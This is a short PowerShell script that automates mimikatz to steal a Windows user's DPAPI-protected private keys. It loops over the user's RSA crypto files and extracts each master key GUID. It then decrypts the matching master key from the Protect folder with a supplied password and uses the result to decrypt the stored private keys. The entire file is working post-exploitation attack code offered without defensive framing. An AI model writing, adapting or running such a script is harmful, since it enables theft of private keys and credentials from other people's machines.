

Get-ChildItem ".\RSA\S-1-5-21-788893716-389553871-1612069284-1001\"  | 
Foreach-Object {
    $pass = "USER_PASS"
	#Write-Host $_.FullName
    $first_step = "mimikatz.exe `"dpapi::capi /in:" + $_.FullName + "`" `"exit`" |findstr guidMasterKey"
    
	$salida = cmd /c $first_step
    $oneline = ($salida -split '\n')[0]
    
    $master_key = [regex]::Matches($oneline, '{([^/)]+)}')|ForEach-Object { $_.Groups[1].Value }
    write-host $master_key

    #decrypt masterkey with pass
    $second_step = "mimikatz.exe `"dpapi::masterkey /in:.\Protect\S-1-5-21-788893716-389553871-1612069284-1001\" + $master_key + " /password:"+ $pass + " `"  `"exit`"|findstr sha1"
    $salida = cmd /c $second_step
    
    $sha1_key = ($salida -split ' ')[3]
    #write-host $sha1_key

    #decrypt private key
    $third_step = "mimikatz.exe `"dpapi::capi /in:" + $_.FullName + " /masterkey:" + $sha1_key + "`" `"exit`" "
    write-host $third_step
    $salida = cmd /c $third_step
    write-host $salida
    
}
